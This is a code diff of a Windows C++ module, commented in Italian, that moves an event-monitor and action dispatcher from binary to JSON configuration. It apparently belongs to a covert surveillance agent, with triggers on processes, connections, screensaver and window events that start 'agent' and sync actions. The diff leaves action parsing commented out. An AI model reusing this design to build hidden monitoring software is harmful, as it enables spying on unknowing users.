@@ -8,6 +8,7 @@
 #include "status_log.h"
 #include "SM_Core.h"
 #include "SM_ActionFunctions.h"
+#include "JSON\JSON.h"
 #include "SM_EventHandlers.h"
 
 
@@ -22,18 +23,20 @@
 #define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
 #define SYNCM_SLEEPTIME 100
 
-typedef void (WINAPI *EventMonitorAdd_t) (BYTE *, DWORD, event_param_struct *, DWORD);
+typedef void (WINAPI *EventMonitorAdd_t) (JSONObject, event_param_struct *, DWORD);
 typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
 typedef BOOL (WINAPI *ActionFunc_t) (BYTE *, DWORD);
 
 ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 
+typedef void (WINAPI *conf_callback_t)(JSONObject);
+extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
 
 // Gestione event monitor  ----------------------------------------------
 
 typedef struct  {
-	DWORD event_type;
+	WCHAR event_type[32];
 	EventMonitorAdd_t pEventMonitorAdd;
 	EventMonitorStart_t pEventMonitorStart;
 	EventMonitorStop_t pEventMonitorStop;
@@ -58,12 +61,14 @@ typedef struct {
 // Tabella degli event monitor attualmente registrati
 DWORD event_monitor_count = 0;
 event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];
+DWORD g_event_id = 0; // contatore dell'evento attulamente in inserzione
 
 // Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
 event_table_struct *event_table = NULL;
 DWORD event_count = 0;
 
-DWORD WINAPI RepeatThread(repeated_event_struct *repeated_event) {
+DWORD WINAPI RepeatThread(repeated_event_struct *repeated_event)
+{
 	DWORD i = 0;
 	LOOP {
 		CANCELLATION_SLEEP(repeated_event->semaphore, repeated_event->delay);
@@ -109,14 +114,14 @@ void StopRepeatThread(DWORD event_id)
 }
 
 // Registra un nuovo event monitor
-void EventMonitorRegister(DWORD event_type, EventMonitorAdd_t pEventMonitorAdd, 
+void EventMonitorRegister(WCHAR *event_type, EventMonitorAdd_t pEventMonitorAdd, 
 						  EventMonitorStart_t pEventMonitorStart,
 						  EventMonitorStop_t pEventMonitorStop)
 {
 	if (event_monitor_count >= MAX_EVENT_MONITOR)
 		return;
 
-	event_monitor_array[event_monitor_count].event_type = event_type;
+	swprintf_s(event_monitor_array[event_monitor_count].event_type, L"%s", event_type);
 	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
 	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
 	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;
@@ -140,6 +145,7 @@ void EventMonitorStopAll()
 
 void EventTableInit()
 {
+	g_event_id = 0;
 	SAFE_FREE(event_table);
 	event_count = 0;
 }
@@ -163,15 +169,15 @@ void SM_EventTableState(DWORD event_id, BOOL state)
 }
 
 // Assegna una riga "evento" della configurazione al corretto event monitor
-void EventMonitorAddLine(DWORD event_type, BYTE *param, DWORD param_len, event_param_struct *event_param, DWORD event_id, BOOL event_state)
+void EventMonitorAddLine(const WCHAR *event_type, JSONObject conf_json, event_param_struct *event_param, DWORD event_id, BOOL event_state)
 {
 	DWORD i;
 	// Inizializza lo stato attivo/disattivo dell'evento
 	SM_EventTableState(event_id, event_state);
 
 	for (i=0; i<event_monitor_count; i++)
-		if (event_monitor_array[i].event_type == event_type) {
-			event_monitor_array[i].pEventMonitorAdd(param, param_len, event_param, event_id);
+		if (!wcsicmp(event_monitor_array[i].event_type, event_type)) {
+			event_monitor_array[i].pEventMonitorAdd(conf_json, event_param, event_id);
 			break;
 		}
 }
@@ -407,68 +413,55 @@ ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 }
 
 //-----------------------------------------------------------------------------------
+void WINAPI ParseEvents(JSONObject conf_json)
+{
+	event_param_struct event_param;
 
+	if (conf_json[L"start"]->IsNumber())
+		event_param.start_action = conf_json[L"start"]->AsNumber();
+	else
+		event_param.start_action = AF_NONE;
+
+	if (conf_json[L"stop"]->IsNumber())
+		event_param.stop_action = conf_json[L"stop"]->AsNumber();
+	else
+		event_param.stop_action = AF_NONE;
+
+	if (conf_json[L"repeat"]->IsNumber())
+		event_param.repeat_action = conf_json[L"repeat"]->AsNumber();
+	else
+		event_param.repeat_action = AF_NONE;
+
+	if (conf_json[L"iter"]->IsNumber())
+		event_param.count = conf_json[L"iter"]->AsNumber();
+	else
+		event_param.count = 0;
+
+	if (conf_json[L"delay"]->IsNumber())
+		event_param.delay = conf_json[L"delay"]->AsNumber();
+	else
+		event_param.delay = 0;
+
+	EventMonitorAddLine(conf_json[L"event"]->AsString().c_str(), conf_json, &event_param, g_event_id++, conf_json[L"enabled"]->AsBool());
+}
 
 // Istruisce gli EM per il monitor degli eventi e popola l'action table sulla base 
 // del file di configurazione
-
-// Struttura del file di configurazione:
-// DWORD condition_count = numero delle condizioni 
-// Per ogni monitor:
-//     DWORD tag = identificativo handler
-//     DWORD event_id = evento da scatenare
-//     DWORD param_len = lunghezza parametro
-//     BYTE param[] = parametro
-// DWORD action_count = numero delle azioni (coincidente col numero degli eventi)
-// Per ogni action
-//     DWORD subaction_count = numero delle sottoazioni
-//     Per ogni sottoazione
-//        DWORD tag = identificativo action function
-//        DWORD param_len = lunghezza parametro
-//        BYTE param[] = parametro
-     
-
 void UpdateEventConf()
 {
-	BYTE *conf_memory;
-	DWORD event_id = 0;
-	event_param_struct event_param;
+	char *conf_memory;
+	if (!(conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE)))
+		return;
 
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		DWORD index, condition_count, action_count, subaction_count, tag, action_id, event_status, param_len;
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, EVENT_CONF_DELIMITER);
-
-		// ---- Condizioni ----
-		READ_DWORD(condition_count, conf_ptr);
-		EventTableInit();
-		for (index=0; index<condition_count; index++) {
-			READ_DWORD(tag, conf_ptr);
-			READ_DWORD(action_id, conf_ptr);
-			READ_DWORD(param_len, conf_ptr);
-
-			ZeroMemory(&event_param, sizeof(event_param));
-			event_param.start_action = action_id;
-			event_param.stop_action = AF_NONE;
-			event_param.repeat_action = AF_NONE;
-			event_param.delay = 0;
-			event_param.count = 0;
-			event_status = TRUE;
+	EventTableInit();
+	HM_ParseConfSection(conf_memory, L"events", &ParseEvents);
 	
-			EventMonitorAddLine(tag, conf_ptr, param_len, &event_param, event_id++, event_status);
-			conf_ptr += param_len;
-		}
+	//ActionTableInit(action_count);
+	//HM_ParseConfSection(conf_memory, L"actions", &ParseActions);
 
-		// ---- Azioni ----
-		READ_DWORD(action_count, conf_ptr);
-		ActionTableInit(action_count);
+	SAFE_FREE(conf_memory);
+
+	/* 	// ---- Azioni ----
 		for (index=0; index<action_count; index++) {
 			READ_DWORD(subaction_count, conf_ptr);
 			for (;subaction_count>0; subaction_count--) {
@@ -480,10 +473,7 @@ void UpdateEventConf()
 					event_action_array[index].is_fast_action = FALSE;
 				conf_ptr += param_len;
 			}
-		}
-
-		SAFE_FREE(conf_memory);
-	}
+		}*/
 }
 
 
@@ -569,13 +559,15 @@ void SM_MonitorEvents(DWORD dummy)
 	InitializeCriticalSection(&action_critic_sec);
 
 	// Registrazione degli EM e delle AF. 
-	EventMonitorRegister(EM_TIMER, EM_TimerAdd, EM_TimerStart, EM_TimerStop);
-	EventMonitorRegister(EM_PROCMON, EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
-	EventMonitorRegister(EM_CONNMON, EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
-	EventMonitorRegister(EM_SCREENS, EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
-	EventMonitorRegister(EM_WINEVEN, EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
-	EventMonitorRegister(EM_QUOTA, EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
-	EventMonitorRegister(EM_NEWWIN, EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);	
+	EventMonitorRegister(L"timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister(L"afterinst", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister(L"date", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister(L"process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
+	EventMonitorRegister(L"connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
+	EventMonitorRegister(L"screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
+	EventMonitorRegister(L"winevent", EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
+	EventMonitorRegister(L"quota", EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
+	EventMonitorRegister(L"window", EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);	
 
 	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
 	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
